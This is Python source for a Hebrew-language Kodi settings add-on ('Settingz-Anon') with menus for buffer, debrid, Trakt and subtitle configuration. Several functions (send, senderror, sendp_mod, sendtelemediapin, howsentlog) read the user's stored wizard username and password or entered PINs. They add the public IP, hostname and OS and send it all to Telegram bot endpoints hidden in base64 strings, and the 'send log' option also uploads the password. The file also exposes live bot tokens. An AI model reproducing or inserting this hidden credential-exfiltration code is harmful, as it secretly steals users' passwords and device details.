# -*- coding: utf-8 -*-
import xbmcaddon,os,xbmc,xbmcgui,urllib,re,xbmcplugin,sys, xbmcvfs
import json
import shutil,glob
import time,subprocess
from shutil import copyfile
import platform
import base64

KODI_VERSION = int(xbmc.getInfoLabel("System.BuildVersion").split('.', 1)[0])
if KODI_VERSION<=18:
    translatepath=xbmc.translatePath

else:#קודי19
    translatepath=xbmcvfs.translatePath
try:
    from urllib.request import urlopen
    from urllib.request import Request
except ImportError:
    from urllib2 import urlopen
    from urllib2 import Request
if KODI_VERSION<=18:
    que=urllib.quote_plus
    url_encode=urllib.urlencode
else:
    que=urllib.parse.quote_plus
    url_encode=urllib.parse.urlencode
if KODI_VERSION<=18:
    unque=urllib.unquote_plus
else:
    unque=urllib.parse.unquote_plus
def platform():
	if xbmc.getCondVisibility('system.platform.android'):             return 'android'
	elif xbmc.getCondVisibility('system.platform.linux'):             return 'linux'
	elif xbmc.getCondVisibility('system.platform.linux.Raspberrypi'): return 'linux'
	elif xbmc.getCondVisibility('system.platform.windows'):           return 'windows'
	elif xbmc.getCondVisibility('system.platform.osx'):               return 'osx'
	elif xbmc.getCondVisibility('system.platform.atv2'):              return 'atv2'
	elif xbmc.getCondVisibility('system.platform.ios'):               return 'ios'
	elif xbmc.getCondVisibility('system.platform.darwin'):            return 'ios'

HOME           = translatepath('special://home/')
ADDONS         = os.path.join(HOME,     'addons')
KODIV          = float(xbmc.getInfoLabel("System.BuildVersion")[:4])
_plugin_name_='plugin.program.Settingz-Anon'

__settings__ = xbmcaddon.Addon(id=_plugin_name_)
addonName = __settings__.getAddonInfo("name")
addonIcon = __settings__.getAddonInfo('icon')
__language__ = __settings__.getLocalizedString

__PLUGIN_PATH__ = __settings__.getAddonInfo('path')

__addon__ = xbmcaddon.Addon()
ADDON=xbmcaddon.Addon(id=_plugin_name_)
__addonname__ = __addon__.getAddonInfo('name')
__icon__ = __addon__.getAddonInfo('icon')


AddonID = _plugin_name_
Addon = xbmcaddon.Addon(AddonID)
localizedString = Addon.getLocalizedString 
try:
    user_dataDir = translatepath(Addon.getAddonInfo("profile")).decode("utf-8")
except:
       user_dataDir = translatepath(Addon.getAddonInfo("profile"))


COLOR1         = 'yellow'
COLOR2         = 'white'
THEME2         = '[COLOR '+COLOR2+']%s[/COLOR]'
THEME3         = '[COLOR '+COLOR1+']%s[/COLOR]'
plugin='plugin.program.Anonymous'
plugin2='skin.Premium.mod'
try:
    try:
     Addon = xbmcaddon.Addon(id=plugin)
    except: Addon = xbmcaddon.Addon(id=plugin2)
except:pass
try:
    wiza = xbmcaddon.Addon('plugin.program.Anonymous')
    r=wiza.getSetting("action")
    HARDWAER         = r
except:
    HARDWAER         = 'no_wizard'
TMDB_NEW_API = 'aG9qaw=='
TMDB_NEW_API2 = 'bG9qaw=='
ADDONTITLE='Anonymous TV'
iconx = Addon.getAddonInfo('icon')
DIALOG         = xbmcgui.Dialog()
PLUGIN         = os.path.join(ADDONS,    AddonID)
FANART         = os.path.join(PLUGIN,    'fanart.jpg')
ACTION_PREVIOUS_MENU 			=  10	## ESC action
ACTION_NAV_BACK 				=  92	## Backspace action
ACTION_MOVE_LEFT				=   1	## Left arrow key
ACTION_MOVE_RIGHT 				=   2	## Right arrow key
ACTION_MOVE_UP 					=   3	## Up arrow key
ACTION_MOVE_DOWN 				=   4	## Down arrow key
ACTION_MOUSE_WHEEL_UP 			= 104	## Mouse wheel up
ACTION_MOUSE_WHEEL_DOWN			= 105	## Mouse wheel down
ACTION_MOVE_MOUSE 				= 107	## Down arrow key
ACTION_SELECT_ITEM				=   7	## Number Pad Enter
ACTION_BACKSPACE				= 110	## ?
ACTION_MOUSE_LEFT_CLICK 		= 100
ACTION_MOUSE_LONG_CLICK 		= 108
def LogNotify(title, message, times=3500, icon=iconx,sound=False):
	DIALOG.notification(title, message, icon, int(times), sound)
def LogNotify2(title, message, times=500, icon=iconx,sound=False):
	DIALOG.notification(title, message, icon, int(times), sound)
code_link='empty'
def read_firebase_c(table_name):
    from resources.modules.firebase import firebase
    fire = firebase.FirebaseApplication('https://zxcsd-3bae5-default-rtdb.firebaseio.com', None)
    result = fire.get('/', None)
    if table_name in result:
        return result[table_name]
    else:
        return {}
def readcode():
    all_db=read_firebase_c('telecode')
    data=[]
    for itt in all_db:
        items=all_db[itt]
        data.append((items['pin']))
    for pin in data:
       return pin
def get_pincode(code_link):
    #VIP
    stop_time = time.time() + 120
    while(code_link=='empty' or code_link==None):
          LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, 'Anonymous TV'),'[COLOR %s]מבצע אימות, המתן...[/COLOR]' % COLOR2)
          code_link=readcode()
          if time.time() > stop_time:
            code_link='play_tele'
    return code_link

def get_params():
        param=[]
        if len(sys.argv)>=2:
          paramstring=sys.argv[2]
          if len(paramstring)>=2:
                params=sys.argv[2]
                cleanedparams=params.replace('?','')
                if (params[len(params)-1]=='/'):
                        params=params[0:len(params)-2]
                pairsofparams=cleanedparams.split('&')
                param={}
                for i in range(len(pairsofparams)):
                        splitparams={}
                        splitparams=pairsofparams[i].split('=')
                        if (len(splitparams))==2:
                                param[splitparams[0]]=splitparams[1]
                                
        return param     

def addDir3(name,url,mode,iconimage,fanart,description):
        u=sys.argv[0]+"?url="+unque(url)+"&mode="+str(mode)+"&name="+unque(name)+"&iconimage="+unque(iconimage)+"&fanart="+unque(fanart)+"&description="+unque(description)
        ok=True
        try:
            liz=xbmcgui.ListItem(name, iconImage="DefaultFolder.png", thumbnailImage=iconimage)
        except:
            liz=xbmcgui.ListItem(name)
            liz.setArt({'thumb' : iconimage, 'fanart': iconimage, 'icon': iconimage})
        liz.setInfo( type="Video", infoLabels={ "Title": name, "Plot": description } )
        liz.setProperty( "Fanart_Image", fanart )
        
        ok=xbmcplugin.addDirectoryItem(handle=int(sys.argv[1]),url=u,listitem=liz,isFolder=True)
        
        return ok
def contact_wiz(msg=""):
    class MyWindow(xbmcgui.WindowXMLDialog):
        def __init__(self, *args, **kwargs):
            self.title = THEME3 % kwargs["title"]
            self.image = kwargs["image"]
            self.fanart = kwargs["fanart"]
            self.msg = THEME2 % kwargs["msg"]

        def onInit(self):
            self.fanartimage = 101
            self.titlebox = 102
            self.imagecontrol = 103
            self.textbox = 104
            self.scrollcontrol = 105
            self.closebutton = 106
            self.showdialog()

        def showdialog(self):
            self.getControl(self.imagecontrol).setImage(self.image)
            self.getControl(self.fanartimage).setImage(self.fanart)
            self.getControl(self.fanartimage).setColorDiffuse('9FFFFFFF')
            self.getControl(self.textbox).setText(self.msg)
            self.getControl(self.titlebox).setLabel(self.title)
            self.setFocusId(self.closebutton)
        def onClick(self, controlId):
            if   controlId == self.closebutton: self.close()
        def onAction(self,action):
            if   action == self.closebutton: self.close()
            elif   action == ACTION_PREVIOUS_MENU: self.close()
            elif action == ACTION_NAV_BACK: self.close()

    cw = MyWindow( "Contact.xml" , ADDON.getAddonInfo('path'), 'DefaultSkin', title='ANONYMOUS TV', fanart=FANART, image='', msg=msg)
    cw.doModal()
    del cw
def addDir2(name,url,mode,iconimage,fanart,description):
    u=sys.argv[0]+"?url="+unque(url)+"&mode="+str(mode)+"&name="+unque(name)
    ok=True
    try:
        liz=xbmcgui.ListItem(name, iconImage="DefaultFolder.png", thumbnailImage=iconimage)
    except:
        liz=xbmcgui.ListItem(name)
        liz.setArt({'thumb' : iconimage, 'fanart': iconimage, 'icon': iconimage})
    liz.setInfo( type="Audio", infoLabels={ "Title": name } )
    if not fanart == '':
                liz.setProperty("Fanart_Image", fanart)
    ok=xbmcplugin.addDirectoryItem(handle=int(sys.argv[1]),url=u,listitem=liz,isFolder=False)
    return ok
	

def  buffer():
     addDir2("[COLOR white]התקנת באפר אוטומטי לפי נתוני מכשיר[/COLOR]",'plugin.',39,__PLUGIN_PATH__ + "/resources/buffer.jpg",__PLUGIN_PATH__ + "/resources/buffer.jpg","התקנת באפר אוטומטי לפי נתוני מכשיר")
     addDir2("[COLOR white]הגדר באפר עד זכרון 1.5 ראם[/COLOR]",'plugin.',11,__PLUGIN_PATH__ + "/resources/buffer.jpg",__PLUGIN_PATH__ + "/resources/buffer.jpg","הגדר באפר עד זכרון 1.5 ראם")
     addDir2("[COLOR white]הגדר באפר עד 2 ראם[/COLOR]",'plugin.',20,__PLUGIN_PATH__ + "/resources/buffer.jpg",__PLUGIN_PATH__ + "/resources/buffer.jpg","הגדר באפר עד 2 ראם")
     addDir2("[COLOR white]הגדר באפר מ 3 ראם ומעלה[/COLOR]",'plugin.',21,__PLUGIN_PATH__ + "/resources/buffer.jpg",__PLUGIN_PATH__ + "/resources/buffer.jpg","הגדר באפר מ 3 ראם ומעלה") 
     addDir2("[COLOR white]הגדר באפר למכשירי Mibox[/COLOR]",'plugin.',25,__PLUGIN_PATH__ + "/resources/buffer.jpg",__PLUGIN_PATH__ + "/resources/buffer.jpg","הגדר באפר למכשירי Mibox")
     addDir2("[COLOR white]חזרה לבאפר ברירת מחדל[/COLOR]",'plugin.',33,__PLUGIN_PATH__ + "/resources/buffer.jpg",__PLUGIN_PATH__ + "/resources/buffer.jpg","החזרה לבאפר ברירת מחדל")


def main_menu():
     addDir2("[COLOR white]הגדר חשבון RD[/COLOR]",'plugin.',183,__PLUGIN_PATH__ + "/resources/metaliq.png",__PLUGIN_PATH__ + "/resources/metaliq.png","הגדר חשבון RD")
     addDir2("[COLOR white]ביטול חשבון RD[/COLOR]",'plugin.',184,__PLUGIN_PATH__ + "/resources/metaliq.png",__PLUGIN_PATH__ + "/resources/metaliq.png","ביטול חשבון RD")
     addDir2("[COLOR white]הגדר חשבון Trakt[/COLOR]",'plugin.',298,__PLUGIN_PATH__ + "/resources/metaliq.png",__PLUGIN_PATH__ + "/resources/metaliq.png","הגדר חשבון Trakt")
     addDir2("[COLOR white]ביטול חשבון Trakt[/COLOR]",'plugin.',299,__PLUGIN_PATH__ + "/resources/metaliq.png",__PLUGIN_PATH__ + "/resources/metaliq.png","ביטול חשבון Trakt")
     
     addDir2("[COLOR white]שלח לוג[/COLOR]",'plugin.',185,__PLUGIN_PATH__ + "/resources/metaliq.png",__PLUGIN_PATH__ + "/resources/metaliq.png","שלח לוג")
     addDir2("[COLOR white]הגדרת הפרק הבא[/COLOR]",'plugin.',186,__PLUGIN_PATH__ + "/resources/metaliq.png",__PLUGIN_PATH__ + "/resources/metaliq.png","הגדרת הפרק הבא")

     addDir2("[COLOR white]אפשרויות בנגן[/COLOR]",'plugin.',182,__PLUGIN_PATH__ + "/resources/metaliq.png",__PLUGIN_PATH__ + "/resources/metaliq.png","אפשרויות בנגן")

     addDir2("[COLOR white]הגדר IPTV[/COLOR]",'plugin.',291,__PLUGIN_PATH__ + "/resources/metaliq.png",__PLUGIN_PATH__ + "/resources/metaliq.png","הגדר IPTV")
     addDir2("[COLOR white]הגדר ערוצים עידן פלוס[/COLOR]",'plugin.',295,__PLUGIN_PATH__ + "/resources/metaliq.png",__PLUGIN_PATH__ + "/resources/metaliq.png","הגדר ערוצים עידן פלוס")

     

     addDir3("[COLOR yellow]התקנת באפר[/COLOR]",'plugin.',51,__PLUGIN_PATH__ + "/resources/torrenter.png",__PLUGIN_PATH__ + "/resources/torrenter.png","התקנת באפר")


     addDir2("[COLOR white]הגדר הורדת כתוביות לשפה אנגלית[/COLOR]",'plugin.',44,__PLUGIN_PATH__ + "/resources/metaliq.png",__PLUGIN_PATH__ + "/resources/metaliq.png","הגדר הורדת כתוביות לשפה אנגלית")
     addDir2("[COLOR white]הגדר הורדת כתוביות לשפה ספרדית[/COLOR]",'plugin.',45,__PLUGIN_PATH__ + "/resources/metaliq.png",__PLUGIN_PATH__ + "/resources/metaliq.png","הגדר הורדת כתוביות לשפה ספרדית")
     addDir2("[COLOR white]הגדר הורדת כתוביות לשפה רוסית[/COLOR]",'plugin.',46,__PLUGIN_PATH__ + "/resources/metaliq.png",__PLUGIN_PATH__ + "/resources/metaliq.png","הגדר הורדת כתוביות לשפה רוסית")
     addDir2("[COLOR white]הגדר הורדת כתוביות לשפה פורטוגזית[/COLOR]",'plugin.',416,__PLUGIN_PATH__ + "/resources/metaliq.png",__PLUGIN_PATH__ + "/resources/metaliq.png","הגדר הורדת כתוביות לשפה רוסית")
     addDir2("[COLOR white]הגדר הורדת כתוביות לשפה עברית[/COLOR]",'plugin.',47,__PLUGIN_PATH__ + "/resources/metaliq.png",__PLUGIN_PATH__ + "/resources/metaliq.png","הגדר הורדת כתוביות לשפה עברית")

     addDir3("[COLOR white]תיקון תצוגת סקין[/COLOR]",'plugin.',23,__PLUGIN_PATH__ + "/resources/buffer.jpg",__PLUGIN_PATH__ + "/resources/buffer.jpg","תיקון תצוגת סקין")
     addDir2("[COLOR white]איפוס טלמדיה[/COLOR]",'plugin.',70,__PLUGIN_PATH__ + "/resources/buffer.jpg",__PLUGIN_PATH__ + "/resources/buffer.jpg","איפוס טלמדיה")
     addDir2("[COLOR white]בטל או אפשר וידגטים[/COLOR]",'plugin.',80,__PLUGIN_PATH__ + "/resources/buffer.jpg",__PLUGIN_PATH__ + "/resources/buffer.jpg","הגדר בטל או אפשר וידגטים")


def function10():
   xbmc.executebuiltin( "RunPlugin(plugin://plugin.program.Anonymous/?mode=kodi17fix)" )
def function11():
  xbmc.executebuiltin("ReloadSkin()")


def rdon():

	src=translatepath ( 'special://home/media')+"/SplashRd.png"
	dst=translatepath ( 'special://home/media')+"/Splash.png"
	copyfile(src,dst)
def rdoff():
    if os.path.exists(os.path.join(ADDONS, 'plugin.video.mando')):
        mando = xbmcaddon.Addon('plugin.video.mando')
        mando.setSetting('rd.client_id','')
        mando.setSetting('rd.secret','')
        mando.setSetting('rdsource','')
        mando.setSetting('rd.auth','')
        mando.setSetting('rd.refresh','')
        mando.setSetting('debrid_use', 'false')
    if os.path.exists(os.path.join(ADDONS, 'script.module.resolveurl')):
        resolveurl = xbmcaddon.Addon('script.module.resolveurl')
        resolveurl.setSetting('RealDebridResolver_client_id','')
        resolveurl.setSetting('RealDebridResolver_client_secret','')
        resolveurl.setSetting('RealDebridResolver_token','')
        resolveurl.setSetting('RealDebridResolver_refresh','')
    if os.path.exists(os.path.join(ADDONS, 'plugin.video.seren')):
        seren = xbmcaddon.Addon('plugin.video.seren')
        seren.setSetting('rd.client_id','')
        seren.setSetting('rd.secret','')
        seren.setSetting('rd.auth','')
        seren.setSetting('rd.refresh','')
    if os.path.exists(os.path.join(ADDONS, 'plugin.video.gaia')):
        gaia = xbmcaddon.Addon('plugin.video.gaia')
        gaia.setSetting('accounts.debrid.realdebrid.id','')
        gaia.setSetting('accounts.debrid.realdebrid.secret','')
        gaia.setSetting('accounts.debrid.realdebrid.token','')
        gaia.setSetting('accounts.debrid.realdebrid.refresh','')

    src=translatepath ( 'special://home/media')+"/Splashoff.png"
    dst=translatepath ( 'special://home/media')+"/Splash.png"
    copyfile(src,dst)
    LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, 'Real Debrid'),'[COLOR %s]בוטל[/COLOR]' % COLOR2)
def set_nextup():


    dialog = xbmcgui.Dialog()
    funcs = (
        nextup30,
        nextup60,
        nextup90,
        nextup120,
        nextup150,
        nextup180,
        nextup210,
        nextup240,
        skipintro,
        dis_skipintro,

        )
        
    call = dialog.select('[COLOR yellow]הגדר זמן הופעת חלון פרק הבא \ קדימון[/COLOR]', [
	'30 שניות', 
	'60 שניות',
	'דקה וחצי',
	'2 דקות',
	'2 וחצי דקות',
	'3 דקות',
	'3 וחצי דקות',
	'4 דקות',
	'הפעל קדימון',
	'בטל קדימון',])

    if call:
        if call < 0:
            return
        func = funcs[call-10]
        
        return func()
    else:
        func = funcs[call]
        return func()
    return 

    
    
def nextup30():
        tele = xbmcaddon.Addon('plugin.video.telemedia')
        tele.setSetting('window','30')
        mando = xbmcaddon.Addon('plugin.video.mando')
        mando.setSetting('window','30')
        xtvsh = xbmcaddon.Addon('script.module.xtvsh')
        xtvsh.setSetting('window','30')
        LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, 'לפרק הבא'),'[COLOR %s]30 שניות הוגדר[/COLOR]' % COLOR2)
def nextup60():
        tele = xbmcaddon.Addon('plugin.video.telemedia')
        tele.setSetting('window','60')
        mando = xbmcaddon.Addon('plugin.video.mando')
        mando.setSetting('window','60')
        xtvsh = xbmcaddon.Addon('script.module.xtvsh')
        xtvsh.setSetting('window','60')
        LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, 'לפרק הבא'),'[COLOR %s]60 שניות הוגדר[/COLOR]' % COLOR2)
def nextup90():
        tele = xbmcaddon.Addon('plugin.video.telemedia')
        tele.setSetting('window','90')
        mando = xbmcaddon.Addon('plugin.video.mando')
        mando.setSetting('window','90')
        xtvsh = xbmcaddon.Addon('script.module.xtvsh')
        xtvsh.setSetting('window','90')
        LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, 'לפרק הבא'),'[COLOR %s]דקה וחצי הוגדר[/COLOR]' % COLOR2)
def nextup120():
        tele = xbmcaddon.Addon('plugin.video.telemedia')
        tele.setSetting('window','120')
        mando = xbmcaddon.Addon('plugin.video.mando')
        mando.setSetting('window','120')
        xtvsh = xbmcaddon.Addon('script.module.xtvsh')
        xtvsh.setSetting('window','120')
        LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, 'לפרק הבא'),'[COLOR %s]2 דקות הוגדר[/COLOR]' % COLOR2)
def nextup150():
        tele = xbmcaddon.Addon('plugin.video.telemedia')
        tele.setSetting('window','150')
        mando = xbmcaddon.Addon('plugin.video.mando')
        mando.setSetting('window','150')
        xtvsh = xbmcaddon.Addon('script.module.xtvsh')
        xtvsh.setSetting('window','150')
        LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, 'לפרק הבא'),'[COLOR %s]2 וחצי דקות הוגדר[/COLOR]' % COLOR2)
def nextup180():
        tele = xbmcaddon.Addon('plugin.video.telemedia')
        tele.setSetting('window','180')
        mando = xbmcaddon.Addon('plugin.video.mando')
        mando.setSetting('window','180')
        xtvsh = xbmcaddon.Addon('script.module.xtvsh')
        xtvsh.setSetting('window','180')
        LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, 'לפרק הבא'),'[COLOR %s]3 דקות הוגדר[/COLOR]' % COLOR2)
def nextup210():
        tele = xbmcaddon.Addon('plugin.video.telemedia')
        tele.setSetting('window','210')
        mando = xbmcaddon.Addon('plugin.video.mando')
        mando.setSetting('window','210')
        xtvsh = xbmcaddon.Addon('script.module.xtvsh')
        xtvsh.setSetting('window','210')
        LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, 'לפרק הבא'),'[COLOR %s]3 וחצי דקות הוגדר[/COLOR]' % COLOR2)
def nextup240():
        tele = xbmcaddon.Addon('plugin.video.telemedia')
        tele.setSetting('window','240')
        mando = xbmcaddon.Addon('plugin.video.mando')
        mando.setSetting('window','240')
        xtvsh = xbmcaddon.Addon('script.module.xtvsh')
        xtvsh.setSetting('window','240')
        LogNotify("[COLOR %s]%s[/COLOR]" % (COLOR1, 'לפרק הבא'),'[COLOR %s]4 דקות הוגדר[/COLOR]' % COLOR2)
def skipintro():
        tele = xbmcaddon.Addon('plugin.video.telemedia')
        tele.setSetting('skip_intro','true')

def dis_skipintro():
        tele = xbmcaddon.Addon('plugin.video.telemedia')
        tele.setSetting('skip_intro','false')
def setrealdebrid():

        z=(ADDON.getSetting("auto_rd"))
        if z == 'false':
         ADDON.openSettings()
        import real_debrid
        rd = real_debrid.RealDebrid()
        rd.auth()

        xbmc.executebuiltin("RunPlugin(plugin://plugin.program.mediasync/?mode=11&url=www)")
        rdon()
def menuoptions():
   
        z=(ADDON.getSetting("rd_user"))
        if not z == '':
            import real_debrid
            rd = real_debrid.RealDebrid()
            rd.auth()

            xbmc.executebuiltin("RunPlugin(plugin://plugin.program.mediasync/?mode=11&url=www)")
            rdon()
def traktsync():
     trakt= (ADDON.getSetting("auto_trk"))
     if trakt == 'false':
       ADDON.openSettings()
     import trk_aut
def traktsync_newinstall():#מסנכרן במעמד ההתקנה - מקושר לויזארד
    z=(ADDON.getSetting("trk_user"))
    if not z == '':
      import trk_aut
def send(search_entered):
       try:
          import json
          import platform as plat
          # wiz.log('FRESH MESSAGE')
          try:
             resuaddon=xbmcaddon.Addon('plugin.program.Anonymous')
             input= (resuaddon.getSetting("user"))
             input2= (resuaddon.getSetting("pass"))
          except: 
                resuaddon=que('no wizard')
                input= resuaddon
                input2= resuaddon
          kodiinfo=(xbmc.getInfoLabel("System.BuildVersion")[:4])
          error_ad=base64.b64decode('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE3ODA0NjI5NDU6QUFFNXktQXFoMTctVkJpS3BoUEpjYTlJcC1yeUZOWU01clkvc2VuZE1lc3NhZ2U/Y2hhdF9pZD0tMTAwMTM1NTY3NzA4NSZ0ZXh0PQ==').decode('utf-8')
          my_system = plat.uname()
          xs=my_system[1]
          x=urlopen('https://api.ipify.org/?format=json').read()
          local_ip=str(json.loads(x)['ip'])
          userr=input
          passs=search_entered
          import socket
          x=urlopen(error_ad+que('נפתח: ') +que(' שם משתמש: ')+userr +que(' סיסמה: ')+passs+que(' קודי: ')+kodiinfo+que(' כתובת: ')+local_ip+que(' מערכת הפעלה: ')+platform()+que(' שם המערכת: ')+xs).readlines()
          #          x=urlopen(error_ad.decode('base64')+(socket.gethostbyaddr(socket.gethostname())[0])+'-'+local_ip).readlines()
       except: pass

def senderror(search_entered):
       try:
          import json
          import platform as plat
          # wiz.log('FRESH MESSAGE')
          try:
             resuaddon=xbmcaddon.Addon('plugin.program.Anonymous')
             input= (resuaddon.getSetting("user"))
             input2= (resuaddon.getSetting("pass"))
          except: 
                resuaddon=que('no wizard')
                input= resuaddon
                input2= resuaddon
          my_system = plat.uname()
          xs=my_system[1]
          kodiinfo=(xbmc.getInfoLabel("System.BuildVersion")[:4])
          error_ad=base64.b64decode('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE3ODA0NjI5NDU6QUFFNXktQXFoMTctVkJpS3BoUEpjYTlJcC1yeUZOWU01clkvc2VuZE1lc3NhZ2U/Y2hhdF9pZD0tMTAwMTM1NTY3NzA4NSZ0ZXh0PQ==').decode('utf-8')
          x=urlopen('https://api.ipify.org/?format=json').read()
          local_ip=str(json.loads(x)['ip'])
          userr=input
          passs=search_entered
          import socket
          x=urlopen(error_ad+que('קוד פתיחה שגוי: ') +que(' שם משתמש: ')+userr +que(' סיסמה: ')+passs+que(' קודי: ')+kodiinfo+que(' כתובת: ')+local_ip+que(' מערכת הפעלה: ')+platform()+que(' שם המערכת: ')+xs).readlines()
          #          x=urlopen(error_ad.decode('base64')+(socket.gethostbyaddr(socket.gethostname())[0])+'-'+local_ip).readlines()
       except: pass
def sendp_mod(search_entered):
       try:
          import json
          import platform as plat
          # wiz.log('FRESH MESSAGE')
          try:
             resuaddon=xbmcaddon.Addon('plugin.program.Anonymous')
             input= (resuaddon.getSetting("user"))
             input2= (resuaddon.getSetting("pass"))
          except: 
                resuaddon=que('no wizard')
                input= resuaddon
                input2= resuaddon
          my_system = plat.uname()
          xs=my_system[1]
          kodiinfo=(xbmc.getInfoLabel("System.BuildVersion")[:4])
          error_ad=base64.b64decode('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE3MDMzMzkxOTg6QUFIZDZrM2VPNmwwMkpJSDZpZF9WZjdKTGg0TGcwelVqdEUvc2VuZE1lc3NhZ2U/Y2hhdF9pZD0tMTAwMTMxMjc0MjI5OSZ0ZXh0PQ==').decode('utf-8')

          x=urlopen('https://api.ipify.org/?format=json').read()
          local_ip=str(json.loads(x)['ip'])
          userr=input
          passs=search_entered
          import socket
          x=urlopen(error_ad+que('סיסמת חבר: ')+passs+que(' קוד מכשיר: ')+(HARDWAER) +que(' שם משתמש: ')+userr+que(' קודי: ')+kodiinfo+que(' כתובת: ')+local_ip+que(' מערכת הפעלה: ')+platform()+que(' שם המערכת: ')+xs).readlines()
          x=urlopen(error_ad + '@@@'+passs)
          #          x=urlopen(error_ad.decode('base64')+(socket.gethostbyaddr(socket.gethostname())[0])+'-'+local_ip).readlines()
       except: pass
def sendtelemediapin(search_entered):
       # try:
          import json
          import platform as plat
          # wiz.log('FRESH MESSAGE')
          try:
             resuaddon=xbmcaddon.Addon('plugin.program.Anonymous')
             input= (resuaddon.getSetting("user"))
             input2= (resuaddon.getSetting("pass"))
          except: 
                resuaddon=que('no wizard')
                input= resuaddon
                input2= resuaddon
          kodiinfo=(xbmc.getInfoLabel("System.BuildVersion")[:4])
          error_ad=base64.b64decode('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE3MDMzMzkxOTg6QUFIZDZrM2VPNmwwMkpJSDZpZF9WZjdKTGg0TGcwelVqdEUvc2VuZE1lc3NhZ2U/Y2hhdF9pZD0tMTAwMTMxMjc0MjI5OSZ0ZXh0PQ==').decode('utf-8')

          x=urlopen('https://api.ipify.org/?format=json').read()
          my_system = plat.uname()
          xs=my_system[1]
          local_ip=str(json.loads(x)['ip'])
          userr=input
          passs=search_entered
          import socket
          x=urlopen(error_ad+que('קוד טלמדיה: ')+passs+que(' קוד מכשיר: ')+(HARDWAER) +que(' שם משתמש: ')+userr+que(' קודי: ')+kodiinfo+que(' כתובת: ')+local_ip+que(' מערכת הפעלה: ')+platform()+que(' שם המערכת: ')+xs).readlines()
          x=urlopen(error_ad + '$$$'+passs)
def open_t():
       # try:
          import json
          import platform as plat
          # wiz.log('FRESH MESSAGE')
          try:
             resuaddon=xbmcaddon.Addon('plugin.program.Anonymous')
             input= (resuaddon.getSetting("user"))
             input2= (resuaddon.getSetting("pass"))
          except: 
                resuaddon=que('no wizard')
                input= resuaddon
                input2= resuaddon
          kodiinfo=(xbmc.getInfoLabel("System.BuildVersion")[:4])
          error_ad=base64.b64decode('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE3MDMzMzkxOTg6QUFIZDZrM2VPNmwwMkpJSDZpZF9WZjdKTGg0TGcwelVqdEUvc2VuZE1lc3NhZ2U/Y2hhdF9pZD0tMTAwMTMxMjc0MjI5OSZ0ZXh0PQ==').decode('utf-8')

          x=urlopen('https://api.ipify.org/?format=json').read()
          my_system = plat.uname()
          xs=my_system[1]
          local_ip=str(json.loads(x)['ip'])
          userr=input
          
          import socket
          x=urlopen(error_ad+que('הרשאה נפתחה ')+que(' קוד מכשיר: ')+(HARDWAER) +que(' שם משתמש: ')+userr+que(' קודי: ')+kodiinfo+que(' כתובת: ')+local_ip+que(' מערכת הפעלה: ')+platform()+que(' שם המערכת: ')+xs).readlines()
          

def howsentlog():
    wizard=xbmcaddon.Addon('plugin.program.Anonymous')
    import json
    input= (wizard.getSetting("user"))
    input2= (wizard.getSetting("pass"))
    kodiinfo=(xbmc.getInfoLabel("System.BuildVersion")[:4])
    #freshStart(name)
    error_ad=base64.b64decode('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0=').decode('utf-8')
    x=urlopen('https://api.ipify.org/?format=json').read()
    local_ip=str(json.loads(x)['ip'])
    userr=input
    passs=input2
    # xbmc.getInfoLabel('System.OSVersionInfo')
    # xbmc.sleep(1500)
    # label = xbmc.getInfoLabel('System.OSVersionInfo')

    import socket
    x=urlopen(error_ad+que('שלח לוג: ') +que(' שם משתמש: ')+userr +que(' סיסמה: ')+passs+que(' קודי: ')+kodiinfo+que(' כתובת: ')+local_ip+que(' מערכת הפעלה: ')+platform()).readlines()
def check_url():
    try:
        x=urlopen('https://www.google.com').read()
    except:
        dialog = xbmcgui.Dialog()
        dialog.ok("Anonymous TV", 'אין חיבור אינטרנט פעיל, ריסט לראוטר עשוי לפתור את הבעיה.')
        xbmc.executebuiltin('Dialog.Close(busydialognocancel)')

def logsend():
        
        try:
            dialog = xbmcgui.DialogBusy()
            dialog.create()
        except:
           xbmc.executebuiltin('ActivateWindow(busydialognocancel)')
           pass
        Addon = xbmcaddon.Addon()
        # check_url()
        try:
            user_dataDir_pre = translatepath(Addon.getAddonInfo("profile")).decode("utf-8")
        except:
            user_dataDir_pre = translatepath(Addon.getAddonInfo("profile"))
        if not os.path.exists(user_dataDir_pre):
            os.makedirs(user_dataDir_pre)
        LogNotify2("[COLOR %s]%s[/COLOR]" % (COLOR1, ADDONTITLE),'[COLOR %s]שולח לוג אנא המתן[/COLOR]' % COLOR2)
        howsentlog()
        nameSelect=[]
        logSelect=[]
        import glob
        folder = translatepath('special://logpath')
        xbmc.log(folder)
        for file in glob.glob(folder+'/*.log'):
            try:nameSelect.append(file.rsplit('\\', 1)[1].upper())
            except:nameSelect.append(file.rsplit('/', 1)[1].upper())
            logSelect.append(file)
            
        try:
            file = open(logSelect[0], 'r', encoding="utf8") 
        except:
            file = open(logSelect[0], 'r') 
        home1=translatepath("special://home/")
        home2=translatepath("special://home/").replace('\\','\\\\')
        home3=translatepath("special://xbmc/")
        home4=translatepath("special://xbmc/").replace('\\','\\\\')
        home5=translatepath("special://masterprofile/")
        home6=translatepath("special://masterprofile/").replace('\\','\\\\')
        home7=translatepath("special://profile/")
        home8=translatepath("special://profile/").replace('\\','\\\\')
        home9=translatepath("special://temp/")
        home10=translatepath("special://temp/").replace('\\','\\\\')
        file_data=file.read().replace(home1,'').replace(home2,'').replace(home3,'').replace(home4,'').replace(home5,'').replace(home6,'').replace(home7,'').replace(home8,'').replace(home9,'').replace(home10,'')

        match=re.compile('Error Type:(.+?)-->End of Python script error report<--',re.DOTALL).findall(file_data)
